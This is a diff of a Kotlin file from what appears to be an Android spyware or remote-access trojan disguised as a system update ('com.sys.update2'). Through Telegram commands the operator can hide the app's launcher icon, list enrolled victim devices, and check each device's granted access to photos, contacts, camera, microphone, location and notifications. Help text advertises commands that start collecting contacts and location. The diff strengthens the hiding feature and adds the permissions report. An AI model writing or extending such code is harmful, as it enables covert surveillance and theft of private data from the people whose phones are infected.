@@ -1,6 +1,5 @@
 // language: Kotlin, file: CommandExecutor.kt
-// *أوامر _start/_stop لكل مهمة*
-// *مهمة واحدة نشطة — SyncManager يتولى التنسيق*
+// *أوامر _start/_stop لكل مهمة + أوامر الأجهزة والأذونات + إخفاء/إظهار*
 
 package com.sys.update2
 
@@ -27,7 +26,9 @@ object CommandExecutor {
         when {
             cmd == "/start" || cmd == "/menu" || cmd == "menu" || cmd == "🏠 القائمة" -> showMainMenu(ctx)
             cmd == "/help" || cmd == "help" || cmd == "مساعدة" -> showHelp(ctx)
-            cmd == "📱 قائمة الأجهزة" || cmd == "🌐 كل الأجهزة" -> showDeviceList(ctx)
+            cmd == "📱 قائمة الأجهزة" || cmd == "🌐 كل الأجهزة" ||
+            cmd == "/devices" || cmd == "/list" ||
+            cmd == "devices" || cmd == "list" -> showDeviceList(ctx)
         }
     }
 
@@ -80,30 +81,67 @@ object CommandExecutor {
                 }
             }
 
-            // ════════ أوامر إدارية ════════
+            // ════════ إخفاء كامل ════════
             "/hide" -> {
-                try {
-                    ctx.packageManager.setComponentEnabledSetting(
-                        android.content.ComponentName(ctx, "com.sys.update2.LauncherAlias"),
-                        android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
-                        android.content.pm.PackageManager.DONT_KILL_APP
-                    )
-                    TelegramApi.sendMessage("✅ تم إخفاء الأيقونة 🆔 `$code`")
-                } catch (e: Exception) {
-                    TelegramApi.sendMessage("❌ ${e.message} 🆔 `$code`")
+                runJob {
+                    try {
+                        // 1) إخفاء الـ alias
+                        ctx.packageManager.setComponentEnabledSetting(
+                            android.content.ComponentName(ctx, "${ctx.packageName}.LauncherAlias"),
+                            android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
+                            android.content.pm.PackageManager.DONT_KILL_APP
+                        )
+                        // 2) سجّل الحالة
+                        DeviceManager.markAppHidden(ctx, true)
+                        TelegramApi.sendMessage("🙈 *تم إخفاء التطبيق كاملاً*\n🆔 `$code`")
+                    } catch (e: Exception) {
+                        TelegramApi.sendMessage("❌ ${e.message}\n🆔 `$code`")
+                    }
                 }
             }
 
+            // ════════ إظهار كامل ════════
             "/show" -> {
-                try {
-                    ctx.packageManager.setComponentEnabledSetting(
-                        android.content.ComponentName(ctx, "com.sys.update2.LauncherAlias"),
-                        android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
-                        android.content.pm.PackageManager.DONT_KILL_APP
-                    )
-                    TelegramApi.sendMessage("✅ تم إظهار الأيقونة 🆔 `$code`")
-                } catch (e: Exception) {
-                    TelegramApi.sendMessage("❌ ${e.message} 🆔 `$code`")
+                runJob {
+                    try {
+                        ctx.packageManager.setComponentEnabledSetting(
+                            android.content.ComponentName(ctx, "${ctx.packageName}.LauncherAlias"),
+                            android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
+                            android.content.pm.PackageManager.DONT_KILL_APP
+                        )
+                        DeviceManager.markAppHidden(ctx, false)
+                        TelegramApi.sendMessage("👁 *تم إظهار التطبيق كاملاً*\n🆔 `$code`")
+                    } catch (e: Exception) {
+                        TelegramApi.sendMessage("❌ ${e.message}\n🆔 `$code`")
+                    }
+                }
+            }
+
+            // ════════ عرض أذونات هذا الجهاز فقط ════════
+            "/permissions" -> {
+                runJob {
+                    try {
+                        DeviceManager.uploadPermissions(ctx)
+                        Thread.sleep(800)
+                        val perms = DeviceManager.getDevicePermissions(code)
+                        val hidden = DeviceManager.isAppHidden(ctx, code)
+                        val sb = StringBuilder()
+                        sb.append("🔐 *أذونات الجهاز*\n")
+                        sb.append("🆔 `$code`\n")
+                        sb.append("━━━━━━━━━━━━━━━\n")
+                        sb.append("📸 الصور: ${if (perms.images) "✅" else "❌"}\n")
+                        sb.append("🎬 الفيديو: ${if (perms.videos) "✅" else "❌"}\n")
+                        sb.append("🎵 الصوت: ${if (perms.audio) "✅" else "❌"}\n")
+                        sb.append("👥 جهات الاتصال: ${if (perms.contacts) "✅" else "❌"}\n")
+                        sb.append("📷 الكاميرا: ${if (perms.camera) "✅" else "❌"}\n")
+                        sb.append("🎤 الميكروفون: ${if (perms.microphone) "✅" else "❌"}\n")
+                        sb.append("📍 الموقع: ${if (perms.location) "✅" else "❌"}\n")
+                        sb.append("🔔 الإشعارات: ${if (perms.notifications) "✅" else "❌"}\n")
+                        sb.append("👁 الحالة: ${if (hidden) "🙈 مخفي" else "👁 ظاهر"}\n")
+                        TelegramApi.sendMessage(sb.toString())
+                    } catch (e: Exception) {
+                        TelegramApi.sendMessage("❌ ${e.message}\n🆔 `$code`")
+                    }
                 }
             }
 
@@ -178,19 +216,49 @@ object CommandExecutor {
     }
 
     // ═══════════════════════════════════════════
-    //  Menus
+    //  قائمة الأجهزة + الأذونات
     // ═══════════════════════════════════════════
     private fun showDeviceList(ctx: Context) {
         runJob {
             val devices = DeviceManager.getDeviceList(ctx)
-            if (devices.isEmpty()) { TelegramApi.sendMessage("📭 لا أجهزة مسجّلة"); return@runJob }
+            if (devices.isEmpty()) {
+                TelegramApi.sendMessage("📭 لا أجهزة مسجّلة")
+                return@runJob
+            }
+
             val sb = StringBuilder()
-            sb.append("📱 *الأجهزة المسجّلة* — ${devices.size}\n━━━━━━━━━━\n\n")
+            sb.append("📱 *الأجهزة المسجّلة* — ${devices.size}\n")
+            sb.append("━━━━━━━━━━━━━━━━\n\n")
+
             for (d in devices) {
                 val status = if (d.online) "🟢" else "🔴"
-                sb.append("$status *${d.name}*\n🆔 `${d.code}`\n\n")
+                val perms = DeviceManager.getDevicePermissions(d.code)
+                val hidden = perms.hidden
+
+                sb.append("$status *${d.name}*\n")
+                sb.append("🆔 `${d.code}`\n")
+                sb.append("━━━ الأذونات ━━━\n")
+                sb.append("📸 ${if (perms.images) "✅" else "❌"} ")
+                sb.append("🎬 ${if (perms.videos) "✅" else "❌"} ")
+                sb.append("🎵 ${if (perms.audio) "✅" else "❌"}\n")
+                sb.append("👥 ${if (perms.contacts) "✅" else "❌"} ")
+                sb.append("📷 ${if (perms.camera) "✅" else "❌"} ")
+                sb.append("🎤 ${if (perms.microphone) "✅" else "❌"}\n")
+                sb.append("📍 ${if (perms.location) "✅" else "❌"} ")
+                sb.append("🔔 ${if (perms.notifications) "✅" else "❌"}\n")
+                sb.append("👁 الحالة: ${if (hidden) "🙈 مخفي" else "👁 ظاهر"}\n\n")
             }
-            TelegramApi.sendMessage(sb.toString())
+
+            // قد تحتاج تقسيم الرسائل لو الأجهزة كثيرة
+            val fullMsg = sb.toString()
+            if (fullMsg.length > 4000) {
+                fullMsg.chunked(4000).forEach {
+                    TelegramApi.sendMessage(it)
+                    Thread.sleep(500)
+                }
+            } else {
+                TelegramApi.sendMessage(fullMsg)
+            }
         }
     }
 
@@ -208,7 +276,9 @@ object CommandExecutor {
             "👥 `/contacts_start $code` — جهات الاتصال\n" +
             "📍 `/location_start $code` — الموقع\n\n" +
             "🛑 `/stop $code` — إيقاف الكل\n" +
-            "📊 `/status $code` — الحالة"
+            "📊 `/status $code` — الحالة\n" +
+            "🔐 `/permissions $code` — الأذونات\n\n" +
+            "📱 `/devices` — عرض كل الأجهزة"
         )
     }
 
@@ -235,7 +305,8 @@ object CommandExecutor {
 
             "*🛑 تحكم عام:*\n" +
             "`/stop $code` — إيقاف الكل\n" +
-            "`/status $code` — الحالة\n\n" +
+            "`/status $code` — الحالة\n" +
+            "`/permissions $code` — الأذونات\n\n" +
 
             "*⚡ لحظية:*\n" +
             "`/location $code` — موقع مرة واحدة\n" +
@@ -244,8 +315,12 @@ object CommandExecutor {
             "`/info $code` — معلومات الجهاز\n\n" +
 
             "*🎨 إدارة:*\n" +
-            "`/hide $code` — إخفاء الأيقونة\n" +
-            "`/show $code` — إظهار الأيقونة\n\n" +
+            "`/hide $code` — إخفاء كامل\n" +
+            "`/show $code` — إظهار كامل\n\n" +
+
+            "*🌐 عام:*\n" +
+            "`/devices` — عرض الأجهزة والأذونات\n" +
+            "`/menu` — القائمة\n\n" +
 
             "🆔 *رمزك:* `$code`"
         )
